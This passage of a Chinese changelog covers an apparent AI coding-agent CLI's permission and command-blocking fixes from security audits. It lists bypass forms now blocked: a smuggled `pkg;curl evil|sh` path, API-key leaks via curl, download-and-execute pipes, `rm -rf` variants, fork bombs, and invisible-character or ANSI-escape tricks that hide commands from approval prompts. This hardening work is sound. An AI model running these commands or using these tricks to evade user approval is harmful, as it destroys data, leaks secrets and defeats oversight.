## [Unreleased]

## [12.2.0] - 2026-10-09

### Security（第四轮审查）
- **auto 模式自动放行 curl/wget GET**：URL 或请求头里的 `$ANTHROPIC_API_KEY` 会被 shell 展开，一条 GET 就能把密钥发出去；手册的
  auto 行本来就写着“网络请求仍需确认”。现在网络请求（`curl`、`wget`、`iwr`、`irm`）在 auto 模式一律询问；PowerShell 下的
  `curl`/`wget` 在 pwsh 6+ 是真正的 curl.exe/wget.exe，不再按 Windows PowerShell 5.1 的别名判为只读。竞跑与维护任务的 worker
  以 auto 模式运行，受同样约束。
- **自动验证门禁把模型写入的目录名原样拼进 shell 命令**：`done_verify_auto`/`done_verify_tests` 下，模型写出
  `pkg;curl evil|sh/a.go` 或 `my tool/b.go` 这样的文件后，门禁执行 `go vet ./pkg;curl evil|sh`（第二段作为独立命令运行，
  不经任何权限判定）或把 `./my tool` 拆成两个包而误报失败。现在 Go 包路径与 pytest 目标只允许 `[A-Za-z0-9._/-]`，其他目录跳过。
- **deny/ask 规则看不到“程序名是命令替换”的写法**：`$(which rm) -rf x`、`` `which rm` -rf x ``、`& (gcm rm) -rf x`、
  `$(which git) push` 在 bypass 模式下放行。现在替换后紧跟普通词的行按不可读程序处理，所有 deny/ask 规则生效。
- **硬拦截漏网补齐**：`env -S 'rm -rf /'`（`-S` 的值就是命令行）；家目录点通配与父目录（`rm -rf ~/.*`、`~/.[!.]*`、`~/.??*`、
  `~/../*`）；系统盘/家目录的其他拼写（`%SystemDrive%`、`$env:SystemDrive`、`%HOMEDRIVE%%HOMEPATH%`、`${env:USERPROFILE}`、
  `$USERPROFILE`、`/home/$USER`、`%ProgramFiles%`、`%ProgramData%`、`%APPDATA%` 等）；下载内容的更多执行形式
  （`curl … | source /dev/stdin`、`(irm …) | iex`、`(iwr …).Content | iex`、`iwr … | % { iex $_.Content }`、
  `& ([scriptblock]::Create((irm …)))`）；`git -c alias.x='!rm -rf ~' x`；`go test/run -exec 'rm -rf ~'`（也不再算构建命令或
  常规 go 操作）；包装器 `setsid`、`stdbuf`、`ionice`、`strace`、`flock`、`su -c`、`runuser -c`、`wsl`、cmd `start`、
  `Start-Process`；块设备 `/dev/mapper/*`、`/dev/md*`、`\\.\C:`；`systemctl poweroff|reboot|halt`、`init 0|6`、`telinit`。
- 远程监督：`--public-origin`/Host 比较改为不区分大小写（浏览器会把 `https://Phone.Example` 小写发送，之前一律 403）。
- 被屏蔽落盘的工具输出（`~/.cove/tool-outputs`）改为 0700/0600，`~/.cove/errors.log` 改为 0600：两者都可能含读到的密钥、
  工具失败输出或 provider 错误正文。
- 维护任务与竞跑的 `git apply`/补丁捕获加 `--no-textconv`，全局 textconv 驱动不会把二进制改动写成不可应用的文本 diff。

### Fixed（第四轮审查）
**维护任务（`/automations`、`/inbox`）**
- **worker 拿不到 API Key**：私有 worker 配置用普通 JSON 序列化写入，API Key 是打码后的 `sk-r****7890`，子进程加载时清空，
  所有维护任务全部认证失败并按 retries 重复失败。现在写入完整 Key。
- `tick` 串行跑多个到期任务时，后面的任务用 tick 开始时刻做 claim，2 小时租约在执行中就过期、被别的进程标为 uncertain。
  现在每个任务按自己的开始时间 claim。
- 过期的 running claim（worker 崩溃）之前只在 run/tick/event/review 时才转为 uncertain，`/inbox list` 一直显示 running、
  `/automations remove` 被挡住。现在任何 automation/inbox 命令都先回收过期 claim。
- 补丁或日志超过 4 MiB 时，被截断的 4 MiB 内容整段塞进 `result.Error`、state.json 和 REPL 错误行；现在错误只带输出尾部，
  命令失败时只报结果 ID。runner 输出也不再同时存进 `output` 与 `checks[0].output`（看 `checks[0].output`）。
- Windows 上 spec prompt 超过约 32K 字符时子进程启动失败（命令行上限）；超过 24 KiB 的 prompt 改经 stdin 传入。
- 文件锁破陈旧锁后不立即重试：job.lock 过期后第一次 run/tick 必报“lock is held by another writer”。

**竞跑（`/race`）**
- **项目与配置目录不同盘时永远被拒**（`filepath.Rel` 跨卷报错被当成“在项目内”）。
- 候选子进程丢失当前 profile 的 provider/api_key/model（整体覆盖了 `profiles`）；现在 race-budget profile 建在当前 profile 之上。
- 生成或验证留下的被忽略文件（`__pycache__`、`node_modules`、`bin/`）让候选直接失败；现在捕获补丁前清掉忽略文件（它们不可能
  进入补丁，验证器也不应看到）。总超时或取消后，已完整通过验证的候选现在可以 `select`。早退候选的 `generation.status` 不再停在
  `queued`；一个残缺的 run 目录不再让 `/race list` 整体报错；最后一步 `git apply` 不再被 Ctrl+C 中途杀掉留下半应用的工作树；
  `workspace.Capture` 在 ctx 超时时不再误报“detached HEAD”。

**远程监督（`/remote`）**
- **开启后本地待回答的授权提示会被“拒绝”**：本地输入一行指引、远程 steer/pause、队列变化或 5 分钟远程 TTL 到期都会让 scope
  版本变化，而漂移被当作远程拒绝送给本地提示。现在漂移/过期/替换只撤销远程 pending，本地提示按自己的超时继续等待；远程
  cancel、`/remote stop` 与退出仍拒绝。远程 `deny` 之前被报成“授权超时”，现在报为拒绝。
- scope 版本改为按消息文本与附件元数据（类型、文件名、字节数）计算，不再每 250 ms 多次序列化整段 base64 附件。

**引擎**
- 完成校验门禁重试与自审重试不受 `canNudge` 约束，`-p --max-turns N` 最后一次调用给出答复后仍被打回，答复被“迭代上限”错误取代。
- 流式输出期间 Ctrl+C 被记为“API error”中断而不是用户取消。
- `authorizeToolCall` 的 `promptMu` 改为 defer 释放（审批回调 panic 后不再永久阻塞后续审批）；`/record`、`recordEvent` 的开关
  读写放进锁内；`/export` 标记为任务运行中不可执行，`/status`/`/stats` 改读原子消息计数（不再无锁遍历回合线程拥有的消息切片）。
- **开启 thinking 时 masking/压缩后的下一次请求可能被 Anthropic 拒绝**：`stripThinkingBlocks` 连最后一条带 tool_use 的 assistant
  消息的 thinking 块一起删掉，而 API 要求发送该回合的 tool_result 时原样带回这些块。现在只删更早回合的（API 本就忽略它们）；
  thinking 关闭的请求（收尾总结）不再携带历史里的 thinking 块。
- 验证门禁、回归验证、dream 的只读命令与 checkpoint 的后台 `git gc` 超时都只杀外层 shell，`go test`/`node`/`grep -r`/`git repack`
  继续孤儿运行并持着管道（dream 的整理锁一直卡到它自己跑完，checkpoint 的 trim 之后永久停摆）。现在都和 bash 工具一样杀整棵
  进程树并限时读管道（新包 `internal/proctree`）。
- `regression_verify` 复用引擎的 checkpoint 管理器，不再与并行子代理的写入争 `index.lock`；checkpoint 的后台维护改用 channel
  等待，避免 `WaitMaintenance` 与并行 `Create` 撞上 WaitGroup 的 “reused before previous Wait has returned” panic。
- 子代理 5 分钟超时或被取消时丢弃全部部分结果（只剩 “Sub-agent did not finish: timed out”），现在和步数上限一样返回已完成步骤
  摘要；计划执行器对这类超时不再从零重跑一遍。
- 上下文 token 估算把图片 part 按 1600、文件 part 按内容估算（之前计 0，读多张截图后压缩触发滞后）。
- 会话笔记：英文决策关键词加单词边界（`because`/`mouse` 不再被记成决策）；`/compact` 只有真的压缩了才记录 “Context compacted”。
- **`worktree` 工具创建的工作树所有文件工具都拒绝访问**：工作树建在 `../<分支>`，而 read/edit/write/glob/grep 只接受工作目录内的
  路径，模型进入工作树后只能用 shell，错误文案又禁止用 shell 绕过。现在进入工作树后所有工具（含 shell）的工作目录就是该工作树，
  `exit_worktree` 在原项目目录执行 `git worktree remove` 并切回；检查点/`/undo` 仍只覆盖主工作树（手册已说明）。

**配置、附件、计费**
- 删除激活中的 profile 后，顶层 `provider` 里旧的 `base_url`/`image_files_api` 不再残留在 profile 的 key 旁边；
  `cove --profile x --config` 与 `/config` 显示的是带 profile 的配置。
- `.svg`/`.ico`/`.bmp` 等按扩展名归为 `image/*` 但不是位图的文件不再被整条消息拒绝，按文本/文件附件发送；Flash 模型下超限图片
  按 4096 而不是 1568 缩放；`--image`/`--file` 不带 `-p` 时报错而不是静默丢弃；`/skill list` 描述按字符而非字节截断。
- 补 `gpt-5*`、`gpt-4.1*`、`o1`、`o3`、`o4-mini` 的价格与上下文窗口（之前按 $0.435/$0.87 计费、32k 窗口 20k 就压缩、只要
  8000 输出）。

**插件、记忆、命令、工具**
- `/plugin refresh` 在 `git pull` 失败（离线、上游 force-push）时不再回答“已更新”，而是报告使用了缓存索引。
- `/memory remove` 现在和 `/memory add` 一样持记忆写锁，不会被并发的记忆提取“复活”。记忆溯源记录只保留当前修订（旧修订记录
  每次追加都复制全部历史来源，长期无界增长）；损坏的溯源侧文件不再阻断该记忆的写入。
- `/ratelimit` 的 “reset in” 现在随时间递减，窗口已过显示“已重置”。
- `glob` 带 `path` 参数时返回相对工作目录的路径（与 grep 一致），模型按结果 `read` 不再报不存在。
- 技能目录是符号链接时不再被静默跳过（项目技能解析到项目外仍拒绝）。
- MCP 的 SSE / Streamable HTTP 连接在服务器接受连接却不回应时永久挂起（启动的 `LoadFromConfig` 与 `/mcp connect` 一起卡死，
  30 秒启动上限形同虚设）：拨号请求现在有 30 秒响应头超时，事件流正文仍不限时。

**浏览器验收**
- 子资源域名解析失败或页面被取消不再被判为 `fail/safety_policy`（现在是 `network_unavailable`/忽略）；安全拒绝与无效工作流按
  文档记为 `unverified` 而非 `fail`；`--allow-local` 下 `localhost` 同时尝试 `127.0.0.1` 与 `::1`，多地址主机逐个拨号；headless
  渲染的 `browser` 工具不再恒报 `Status: 200`（改为 unknown）；验收证据只在真的降级了什么时才落盘（之前每次 write/edit 都
  fsync 一次）。

**REPL 与终端**
- 钉住模式下候选列表固定 7 行高度并在置 `pinned` 之后再度量保留行数，输入 `/hel` 每个按键不再触发“解除钉住→查询光标→重钉”；
  连续重钉有上限，绘制按保留行数裁剪。
- Shift+Tab 只在空输入（或从面板切回）时切换 Agent 面板焦点；单独输入 `/` 回车显示快捷命令列表而不是填入第一个候选；多行输入
  行数不超过终端高度减 2；←/→/Backspace/Delete 按字素簇移动与删除（`a⚠️b` 上光标不再落在 ⚠ 与 U+FE0F 之间，Backspace 一次删掉
  整个 emoji）；`/keys` 补上 Alt+V、Alt+M、Shift+Tab/空输入 Tab、空输入 Alt+⌫。
- 诊断：HOME 不可用时不再在当前项目里创建 `./.cove` 并写探测文件（数据目录/磁盘空间/会话完整性三项跳过，telemetry 不落盘）；
  网络检查用完即关连接。

**文件系统**
- fsatomic 的根目录原子写先替换再设权限：Windows 上 0444 的临时文件不再让 ReplaceFile 报拒绝访问，POSIX 上 0755 的脚本经
  `/undo` 恢复后保留可执行位。选择性回滚（`/undo <hash> <文件>`）遇到只读目标文件先清除只读属性再替换/删除，恢复后按检查点里的
  模式还原。

### 已知未修（第四轮审查记录）
- automation 的 state.json 仍是单文件整体读写，长期每小时任务下会持续增长，没有清理命令。
- `/cd` 不切换记忆存储与 dream 整理的项目根（二者仍指向启动时的项目，退出时的 worker 则按当前目录整理）；手册已说明 `/cd`
  只重载 policies.json。
- `mobile/mobileapi` 目录仍在源码树中编译，属死代码；是否删除待定。

## [12.1.0] - 2026-10-08

### Added
- **四类显式工作流（首版，默认全部关闭）**：命令注册在交互 REPL 与 headless 的公共前端，
  结果存配置目录、不自动写入原项目；JSON 示例、调度入口与安全边界见
  [工作流指南](docs/guide/workflows.md)。Git worktree 不是 OS/网络/进程沙箱。
  - **维护任务与结果收件箱**：`/automations list|add|run|tick|event|remove` 定义定时或事件触发的
    维护任务，`/inbox list|show|patch|review` 审阅结果。每次尝试在新建的 detached worktree 中以
    committed HEAD 为输入，事件按项目/任务/occurrence key 去重，失败或崩溃不自动重放；收件箱保留基线、
    命令 argv、退出码、输出、补丁与审阅状态，`accepted` 只记录决定，不应用、合并或推送。
  - **浏览器实操验收**：`/browser-verify <spec.json>|results|artifacts` 在 Chrome/Chromium
    （`go build -tags chromedp`）执行 DOM 断言，桌面 1280×800 与移动 390×844 独立重放，保留 PNG、
    尺寸与 SHA256 并接入 `/acceptance`；无标签或 Chrome 不可用时状态为未验证，不会假绿。
  - **双方案竞跑**：`/race run|show|cancel|select` 在两个独立 worktree 用同一显式 argv 验证器跑两个
    方案，模型自评不能决定通过；仅通过候选可显式 `select`，应用前复核项目/分支/commit/干净状态/
    验证器一致性与补丁哈希，退出时取消 worker 并有界清理 worktree。
  - **跨设备监督**：`/remote start|status|stop` 起认证远程监督 API（默认随机 loopback 端口、Bearer
    认证、严格 Host/Origin 校验），可查看任务摘要、排队与引导状态，发送 steer/cancel/pause，并对当前
    待批工具做一次性 approve/deny；请求 ID 防重放，审批绑定工具、输入摘要与有效期、单次消费，本地
    答案、取消、状态漂移或停服即撤销 pending。
  - 独立入口 `cove --automation <action> <项目>` 与 `cove --automation-inbox <action> <项目>` 必须在
    首位，由 OS 调度器显式调用，不默认启动守护进程。
- **`/acceptance` 任务验收证据**：展示当前会话最新任务的验收条件、命令退出码、耗时与输出尾部；报告
  原子保存、切回原会话可查看，每个会话只保留最新一份，后续工具写入或回滚使旧通过证据失效。
- **持久化任务队列**：运行中任务与待执行消息原子保存到配置目录 `task-queues`，重启仅提示、不自动
  重放；`/tasks saved|restore|remove|move|retry|skip|run` 显式恢复与管理。存储失败即暂停队列、不启动
  后续任务并显示错误；崩溃或退出前可能已产生副作用的当前任务标记为“状态不明”，需人工 `/tasks retry`
  或 `/tasks skip` 处理。
- **选择性文件回滚**：`/undo files <检查点> <文件>...` 预览（不改工作区）、`/undo apply <预览ID>` 确认、
  `/undo cancel` 放弃预览。确认令牌绑定本次预览、项目与会话并有有效期；确认前复核全部选中文件漂移，
  不一致则整批拒绝；只恢复选中文件，未选中文件不动，执行前自动备份。
- **记忆溯源**：`/memory source <名称>` 查看当前正文版本的来源会话、项目、消息位置、输入 SHA256 与
  依据片段；手动 `/memory add` 与自动提取都会记录来源，元数据存记忆目录 `.provenance` 隐藏子目录，
  按记忆名与正文 SHA256 绑定，不改正文、不计入记忆提示、不注入模型上下文。
- **`verify` 子智能体与 `regression_verify` 工具**：独立反向回归验证（首版支持 Go）——用修复前检查点
  的旧源码构建 Go overlay，要求同一测试在旧实现上真实失败、在当前实现上通过；子智能体使用独立对话
  上下文，只获得代码阅读工具与该工具，不能改文件、写测试、执行通用 Shell、联网或再派生子智能体；
  仅当旧实现退出码 1 且出现真正的具名测试失败、当前实现退出码 0 才记为通过，证据接入 `/acceptance`
  并在后续文件修改或回滚时失效。

### Fixed
- **长响应体未做上限检查**：`internal/api` 用 `LimitReader` 截断后不再校验，超过 `maxResponseBytes`
  的响应被静默截成无效 JSON；现在多读一字节即报错。
- **取消后的工具调用与重试不响应 context**：工具执行的短暂重试 sleep、并行调度取信号量，以及
  `edit`/`write` 的入口，此前在 `ctx.Done()` 后仍可能继续跑或睡满；现在这些点都检查取消并立即返回。
- **`/continue` 在队列暂停时**：队列因状态不明暂停时不再直接重试，改为提示先 `/tasks retry` 或
  `/tasks skip`。
- **记忆检索索引重复构建**：BM25 每次搜索都重建、按 ID 线性删除并整表重算平均长度；改为按 ID 定位
  增量更新并缓存索引、在条目变化时失效，索引构建只做一次。
- **Windows 原子写入保留属性**：新增 `WriteFileRoot` 走 `os.Root`，root 内替换同样保留隐藏属性与
  NTFS 备用数据流，相对路径不能逃出 root。
- **gate 未执行时记录原因**：完成校验因“本轮无文件变更”或“项目未信任”而未执行时，验收报告单独
  注明，不再与“未验证”混同。

### Changed
- 前端新增统一的工作流关闭钩子：退出或 headless 结束时停止 remote 与 race，并清理竞跑产生的 worktree。
- 记忆检索新增可取消的 `SearchContext` 并在各阶段响应 `ctx`；`Store.All` 抽出 `allLocked` 复用缓存。
- 授权框中新增 `AskSpec.External` 外部答案通道，供远程一次性审批在本机 REPL 线程复核后生效。

## [12.0.0] - 2026-09-30

### Added
- **`/restart`**：保存会话后重启 cove，新进程以 `-r <会话 ID>` 接着当前会话（空会话则新开），
  让新装的技能、插件、配置文件改动或升级后的二进制生效。退出部分与 `/exit` 相同；启动参数沿用，
  去掉 `-r`/`--resume` 与 `--image`/`--file`。Unix 用 exec 原地替换；Windows 没有 exec，首次重启后
  原进程留作监督进程，之后的重启由它统一发起（子进程以退出码 75 + 参数文件请求），不会逐层叠加进程。
  任务运行中不能执行，headless 模式不支持。
- **`/trust`**：信任当前项目的 `.cove.json`（见下方 Security），`/restart` 后其中需要信任的设置生效。

### Security（第三轮审查）
- **`/history delete ..` 删掉整个会话目录**：会话 ID 只经 `filepath.Base` 处理，`..` 原样保留，归档目录
  `archive/..` 解析回会话目录本身，`RemoveAll` 把所有会话、索引和归档一起删掉；`/` 则删掉全部归档。现在
  不是普通文件名的 ID 一律按“没有这个会话”处理。
- **`browser` 工具标记为只读，但 `screenshot` 会写文件**：只读子代理和 plan 模式都能用它覆盖工作区里的任意
  文件（绕过读后写检查与原子替换）。现在 `browser` 不再是只读工具（截图需要授权，与 `write` 一样）；截图只写
  `.png`、不覆盖非 PNG 文件、按 `write` 的方式原子写入。
- **`write`/`edit` 可以写 NTFS 备用数据流**：`README.md:notes` 这样的路径会在工作区里写出对 git、资源管理器和
  `read` 都不可见的隐藏流。现在所有文件工具一致拒绝卷标之后带 `:` 的路径。
- **模型起的名字可以指向记忆目录的记账文件**：dream 的 write/edit、记忆提取的 `FILE:` 和 `/memory add` 都接受
  `.consolidate-lock`、`.memory-write.lock`、`.last-extraction.json` 这类点文件名，能覆盖正在运行的整理锁。现在
  记忆文件名一律不能以点开头（提取时去掉前导点，dream 与 `/memory add` 直接报错）。
- **单独的 CR 与不可见空白可以绕过全部命令检查**：PowerShell 把单独的 `\r`、NEL、U+2028/U+2029 当作换行，把
  FF、VT、不间断空格等 Unicode 空白当作参数分隔，而分词器把 `\r` 当空白、对其余一无所知。于是
  `ls<CR>Remove-Item -Recurse -Force …` 算只读并自动批准，`go test ./...<CR>rm -rf ./src` 被记住的 `go test`
  前缀放行，`echo hi<CR>Remove-Item … C:\Windows` 绕过硬拦截，`find . -type f<FF>-delete` 算只读。现在所有
  shell 的分词器都按这个规则切分；含这类字符、其他控制字符、零宽/双向控制等不可见格式字符或非法 UTF-8 的命令
  一律不算只读、不自动批准、不被记住的前缀/分组/`param_match` 规则覆盖，改为询问；硬拦截同时按去掉不可见字符
  后的形式检查（`r<零宽空格>m -rf /` 也拦）。
- **deny/ask 规则看不到嵌套命令**：整工具允许 bash 再 deny `git push` 时，`bash -c 'git push origin main'`、
  `eval '…'`、`xargs -0 git push`、`find . -exec git push \;`、`git -c alias.p=push p` 都放行。现在规则会看进
  `sh -c`/`bash -c`、`cmd /c`、`powershell "…"`、`eval`/`iex`、`xargs`、`find -exec/-execdir/-ok`、管道进 shell 的
  heredoc；命令行上定义了 git 别名（`git -c alias.*=`、`--config-env`、`git config alias.*`）时所有 git 规则都生效；
  嵌套命令的程序是变量（`bash -c "$CMD"`、`eval "$x"`）时所有 deny/ask 规则都生效。
- **硬拦截漏网**：`rm -rf /**`、`/*/`、`/etc/**`、`~/**`（只剥一个 `*`、`*` 后的 `/` 不处理）；正斜杠写法的
  `C:/Windows`、`C:/Users`、`c:/program files/`；Git Bash 的 `/c`、`/c/`、`/c/Windows`、`/mnt/c`、`/cygdrive/c`；
  `/{etc,usr}` 花括号展开；PowerShell 数组参数 `.,C:\Windows`；`rm -rfvvv /`（短选项只认 1–4 个字母）；
  `curl … | bash -s -- install`、`| sh -s x`、`| bash /dev/stdin`、`| bash -`、`| bash -e`、`| python3 -`；
  `powershell "Remove-Item -Recurse -Force C:\Windows"`（第一个位置参数就是 -Command）；`find -P / -delete`、
  `find -L / -exec rm -rf {} +`（GNU 的 `-H/-L/-P/-D/-O` 在路径之前）；`cat <<'EOF' | sh` 的 heredoc 正文；
  `rm$IFS$9-rf$IFS$9/`；`shred`/`tee`/`cp`/`mv` 写入块设备（`/dev/sd*`、`/dev/nvme*`、`\\.\PhysicalDrive*`）；
  `function f { f|f& }; f` 形式的 fork bomb。以上现在全部拦截。此外 cmd 风格开关只对 `del`/`erase`/`rd`/`rmdir`
  跳过（以前任何 `/x` 都被当开关，`rm -rf /c` 从未被判定）。
- **`policies.json` 的 `param_match.command` 是整行前缀匹配**：`{"param_match":{"command":"git status*"}}` 的
  allow 会放行 `git status; rm -rf ./src`。现在按简单命令逐条匹配：allow 要求行内每条命令都匹配且不含命令替换
  或写文件的重定向；deny/ask 只要任一条命令（含嵌套命令）匹配即生效；末尾单个 `*` 按整词扩展（`git status*`
  不匹配 `git statusx`）。
- **question 工具的提问文字未经清洗**：标题、问题、选项和说明直接打印，模型可以用 `\x1b[2A\x1b[2K…` 在你按数字
  之前重画选项列表。现在与授权框一样经 `VisibleControls` 显示（`\e[2A` 原样可见）；授权提示里的“记住范围”行
  和“已记住的规则未覆盖”说明同样处理，MCP 服务器/工具名不能再借此重绘授权框。
- **`VisibleControls` 不显示零宽字符**：`echo hi <零宽空格>#; rm -rf ~` 在授权提示里看起来是注释，bash 却会执行
  `rm`。零宽空格/连接符/BOM/软连字符/标签字符等现在显示为 `\uXXXX`；emoji 组合序列里的零宽连接符保持原样。

### Fixed（第三轮审查）
- **bash 下 `git stash show -p stash@{0}`、`git diff HEAD@{1}`、`git log @{u}..HEAD` 被当成未知命令**：未加引号的
  `{`/`}` 会把行切开。bash 里花括号只在展开（`{a,b}`、`{1..3}`）或词首命令组时特殊，词内的 `X@{…}` 现在按字面
  处理，这些只读写法可以免询问并记住；花括号展开仍询问，PowerShell 下未加引号的花括号仍询问。
- **auto 模式**新增自动批准：`dotnet test/build/run`（带 `--force` 除外）、`pytest`（带 `--basetemp` 除外）、
  `go list`、`gofmt`、不带参数的 `make`，以及 `npm run test:unit`、`lint:fix`、`build:prod`、`pnpm test:e2e`、
  `yarn lint:ci` 这类带冒号后缀的 test/lint/build 脚本。
- **输入行里的 ⚠️ ❤️ ✔️ 1️⃣ 或多人 emoji 宽度算错**：编辑器按单个字符累加宽度，VS16/ZWJ 组合序列算 1 格实际占
  2 格，行溢出、重绘后留下幽灵行。单行、多行和任务运行中的底部输入行现在都按字素簇计算，可见窗口不再从
  emoji 序列中间开始。
- **一次没收到光标位置应答就永久关闭底部输入行**：应答若在 Ctrl+R 搜索、粘贴或 `ReadLine` 返回后到达会被丢弃
  （搜索还会被意外退出），300 ms 超时后本会话不再固定输入行。现在所有读取 CSI 的地方都把光标应答交给等待者；
  一次未应答只暂停 30 秒，连续 3 次才停用，之后收到任何应答即恢复。
- 移动端：任务进行中 `Reset` 只清空消息不取消请求，旧任务的工具结果追加到新会话开头，之后每个请求都被拒绝。
  现在 `Reset`/`Init` 取消进行中的请求并丢弃旧代次的结果（以 `cancelled: conversation reset` 结束）。
- 诊断：`~/.cove` 无写权限时被额外误报为致命的“磁盘空间不足”（任何写失败都算磁盘满）。现在只有 ENOSPC/EDQUOT
  （Windows 112/39）才报磁盘不足，其他失败跳过该项并指向“数据目录”检查。
- 渲染：以 8 位 ST（0x9C，UTF-8 形式 C2 9C）结尾的 OSC/DCS 序列不被识别为结束，吞掉其后最多 256 字节正文。
- **流式响应里的供应商错误不触发切换**：Anthropic 的 `event: error`（`overloaded_error`、`rate_limit_error`）和
  OpenAI 兼容端点的 `{"error":{"code":503}}` 数据块只包成普通文本错误，分类为未知，供应商回退与冷却都不生效。
  现在按等价的 HTTP 状态码处理（529/429/500/401/400…），错误文本形如 `API error 529: provider stream error: …`。
- **计费缺少 Claude 4 / 4.1 / 4.5 代的价格**：Sonnet 4/4.5、Opus 4/4.1/4.5 按默认单价（$0.435/$0.87 每百万
  token）计算，少算 7–35 倍，`max_budget_usd` 形同虚设。已按公开价目补齐；**未收录的 `claude-*` 型号改按 Opus
  单价（$15/$75）估算**，宁可高估，所以这类型号的 `/cost` 数字会比以前高；非 Claude 的未知型号仍用默认单价。
- Opus 4 / 4.1 缺少输出上限（32000）：按 200k 窗口预留 50000 输出，每次请求都被 400 拒绝。同时补上 Sonnet
  4/4.5、Opus 4.5 的 64000。
- OpenAI 推理模型（o1/o3/o4/gpt-5 系列）拒绝 `max_tokens`：现在按模型名改发 `max_completion_tokens`，经网关
  转发时同样生效；其他模型和第三方兼容端点不变。
- `anthropic-ratelimit-*-reset` 是 RFC 3339 时间戳，之前只按时长解析，`/ratelimit` 里的重置倒计时永远是 0。
- 所有供应商都在冷却期时按 Ctrl+C 取消请求，报出的是上一次陈旧的供应商错误而不是“已取消”。
- **Windows 上把活着的整理进程判成已死**：`os.FindProcess` 对更高完整性级别或其他用户的进程返回拒绝访问，
  代码把一切错误当作“进程不存在”，于是活着的持锁者的锁被当作陈旧锁接管（两个整理同时改同一批文件），
  `recoverDeadWorker` 也会回滚活 worker 的锁。现在用最小权限打开进程并查询退出码，拒绝访问视为存活；
  Unix 侧 `kill(pid, 0)` 返回 EPERM 同样视为存活（原先 `Signal(nil)` 对任何 pid 都返回错误，锁完全没有互斥）。
- 整理完成后到任务收尾之间执行 `/dream cancel`，`RollbackConsolidationLock` 不检查是否仍持有锁，把刚写好的完成
  标记和时间戳删掉，那批会话下次又被整理一遍。现在不持有锁时回滚不碰文件。
- **文件锁破陈旧锁时会移走别人刚建的新锁**：判定陈旧和重命名之间，旧持有者释放、新持有者建锁，重命名移走的是
  新锁——要么两个写者都以为自己持锁，要么没人删它、后来者一律等到 30 秒超时。现在先读锁内容再判定，移走后
  内容不一致就放回去；读不到内容不视为陈旧。
- `/memory add` 绕过记忆写锁（进程内锁与目录锁文件），会被同时进行的记忆提取“读→追加→重命名”覆盖，或反过来
  覆盖提取刚写的内容。现在与提取、dream 同一顺序取锁；锁被长期占用时提示“记忆目录正被另一个 cove 进程写入，请稍后重试”。
- 网页搜索摘要按字节偏移截取，切在多字节字符中间时给模型发出非法 UTF-8（部分供应商直接拒绝请求）。
- **文件名接近 255 字节时 `write`/`edit` 失败**：临时文件名多出约 21 字节超过系统限制，`CreateTemp` 报
  “文件名语法不正确”，而旧的直接写入是能写的。现在过长的名字用哈希缩短临时文件名，仍在同一目录原子替换。
- `webfetch` 的授权判断用原始输入判定是否内网地址，`example.com/?next=http://127.0.0.1/` 被当成访问
  127.0.0.1 拒绝，而实际抓取的是 `https://example.com`。现在先按抓取时同样的方式规范化 URL 再判断。
- `task_stop` 对不存在的任务 ID 也回答“已停止”，现在与 `task_get`/`task_update` 一样返回未找到错误。
- **循环检测把编辑不同文件当成重复调用**：`edit`/`write` 用 `file_path`/`path`/`filepath`/`file` 这些参数别名传路径时，
  指纹里只剩工具名，连续编辑 10 个不同文件到第 5 次就被判为循环并强制终止。指纹、压缩摘要、后台回顾、文件类
  技能提示和文件活动统计现在都识别这些别名。
- **以别名调用工具时不建检查点**：模型发出 `Edit`/`Write`/`PowerShell`/`Agent` 这类别名，检查点、shell 写判断和
  子代理判断都按原始名比较，文件改了却没有快照，`/undo` 无法回退。现在在分发前统一换成注册表里的规范名；
  `PowerShell` 别名执行且退出码非零的命令也会标记为失败。
- `-p --max-turns N` 下模型在最后一次调用给出答复但 todo 仍有未完成项时，答复被“迭代上限”错误取代（todo 收尾
  提示没有像其他提示那样让位于已有答复）。
- 过载/限流后切换到备用模型只改了本轮模型字段，后续的工具输出上限、窗口收缩、上下文用量显示仍按失败的模型计算。
- 上一轮的工具连续失败计数不清零，新请求第一批工具一失败就注入“3+ 次失败”提示并切换模型；现在新请求重置，
  恢复同一中断请求时保留。
- 后台技能回顾读取的是当时的会话 ID，与 `/new`、`/resume` 并发时会把学到的技能记到新会话名下（也是一处数据竞争）；
  现在在回合线程上捕获会话 ID。
- 验证命令输出（如中文编译错误）截尾时按字节切，可能切在多字节字符中间，给模型发出非法 UTF-8；20000 字节的输出
  上限同样如此。
- **REPL 不去掉输入首尾空白**：Tab 补全留下的尾随空格让 `/history ` 试图恢复名为空的会话、`/compact ` 落到
  只会提示“请用 REPL 内置路径”的通用命令、`exit ` 被当成消息发出，纯空格行会向模型发一次空消息（计费，且
  部分供应商直接报错）。现在与 headless 一致，先去掉首尾空白。
- 不带参数的 `/history detail`、`/history delete` 会去恢复名为 detail/delete 的会话，而不是打印用法。
- headless 下 `/history` 之后若干轮再输入一个数字仍会切换会话（选择状态不清除）。
- 任务 panic 恢复时先清空当前任务再回收插入的指引，回收的指引丢掉了“这是在哪个任务期间补充的”上下文。
- 激活 profile 时把 profile 拥有的字段清为 profile 存不下的值（`/config budget 0`）只写到顶层，profile
  里的旧值留着，重启后又回到旧值。
- MCP：`tools/list` 或 `resources/list` 失败（超时、JSON-RPC 错误）被静默吞掉，服务器显示为已连接但 0 个
  工具且无报错；一次自动重连用完后再断线的 stdio 服务器不再被回收（子进程不 Wait、管道一直开着），现在
  关闭并在 `/mcp list` 里给出原因。

### Security（系统性测试发现）
- **`eval`/`iex` 包裹的灾难命令不被硬拦截**：`eval 'rm -rf /'`、`bash -c 'eval "rm -rf /"'`、`iex 'rm -rf /'`、
  `Invoke-Expression "Remove-Item -Recurse -Force C:\"`。deny 规则那条路径早已展开 eval，灾难扫描没有；现在共用同一
  个展开函数。
- **`xargs`/`find -exec` 行内写死的危险目标不被硬拦截**：`xargs rm -rf /`、`xargs -0 rm -rf /`、`find . -exec rm -rf / \;`、
  `find . -execdir rm -rf ~ +`（只拦了 `echo / | xargs rm -rf`）。现在把 xargs/-exec 之后的词当独立命令再判一遍，
  嵌套的 shell、eval、再一层 xargs 也拆开看。
- **进程替换 / 命令替换执行下载内容不被硬拦截**：`bash <(curl …)`、`source <(curl …)`、`. <(curl …)`、
  `python3 <(curl …)`、`sh -c "$(curl …)"`、`eval "$(curl …)"`、反引号形式、直接执行 `$(curl …)`、
  `echo "$(curl …)" | sh`、`iex (iwr …)`、`iex (irm …)`；BSD `fetch` 也算下载源。只把下载结果当数据参数的
  （`python3 parse.py <(curl …)`、`diff <(curl a) <(curl b)`、`git commit -m "$(curl …)"`）不拦。
  仍未覆盖：`iex (New-Object Net.WebClient).DownloadString('…')`。
- **顶层程序名是变量时 deny/ask 规则不命中**：整工具允许 bash 再 deny `git push`，`$GIT push`、`G=git; $G push`、
